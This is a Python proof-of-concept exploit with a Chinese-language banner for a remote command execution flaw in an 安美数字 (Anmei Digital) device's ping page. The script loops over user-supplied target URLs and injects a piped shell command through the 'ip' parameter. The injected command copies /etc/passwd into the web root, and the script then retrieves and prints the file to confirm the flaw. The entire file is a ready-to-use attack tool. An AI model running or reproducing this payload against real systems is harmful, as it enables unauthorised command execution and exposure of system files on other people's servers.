import requests
import urllib3
urllib3.disable_warnings()

def poc():
    print('+---------------------------------------------------+')
    print('+ \033[1;36m安美数字 远程命令执行漏洞\033[0m                         +')
    print('+ \033[1;36m公众号：bgbing安全\033[0m                                +')
    print('+ \033[1;36m作者：黑子黑\033[0m                                      +')
    print('+ \033[1;36murl >>>http://xxx.xxx.xxx.xxx\033[0m                     +')
    print('+---------------------------------------------------+')
poc()
while 1:
    first=input("\033[1;36murl >>>\033[0m")
    url=first+"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../cmd.txt&id=1"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
        }
    response=requests.get(url,headers=header,verify=False,timeout=10)
    if 'doTestResult' in response.text:
        url=first+"/cmd.txt"
        response=requests.get(url,headers=header,verify=False,timeout=10)
        if 'root' in response.text:
            print("\033[1;36m"+response.text+"\033[0m")
        else:
            print("\033[1;31m不存在漏洞\033[0m")
